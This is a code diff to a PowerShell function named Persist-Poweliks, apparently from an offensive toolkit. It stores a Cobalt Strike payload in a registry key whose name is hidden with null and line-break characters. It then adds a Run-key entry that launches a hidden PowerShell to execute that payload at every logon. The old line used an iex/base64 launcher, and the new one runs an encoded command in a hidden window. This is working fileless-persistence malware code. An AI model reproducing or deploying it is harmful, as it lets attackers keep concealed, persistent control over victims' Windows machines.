@@ -20,9 +20,10 @@ PS C:\> Persist-Poweliks -cobaltstrike_gen_payload <provided by cobalt strike>
         [Parameter(Mandatory=$True)]
         [string]$cobaltstrike_gen_payload
     )
-
     [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
     $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
+
+    $powershell_path = (Get-Process powershell | select -First 1).path
 
     #Write the malformed registry key
     new-item -path "HKLM:SOFTWARE\$malformed_string" -force
@@ -30,5 +31,5 @@ PS C:\> Persist-Poweliks -cobaltstrike_gen_payload <provided by cobalt strike>
     #Write the powershell bytecode to a key, $malformed_string, in HKLM:SOFTWARE\$malformed_string
     new-ItemProperty -path "HKLM:SOFTWARE\$malformed_string" -name "$malformed_string" -value "$cobaltstrike_gen_payload"
 
-    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "powershell.exe -ep bypass -c iex ([Text.Encoding])::ASCII.GetString([Convert]::FromBase64String((gp `'HKCU:SOFTWARE\$malformed_string`').$malformed_string)));"
-}
+    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "$powershell_path -windowstyle hidden -c `"`$val = (gp HKLM:SOFTWARE\`'$malformed_string`').`'$malformed_string`'; $powershell_path -windowstyle hidden -ec `$val`""
+} 
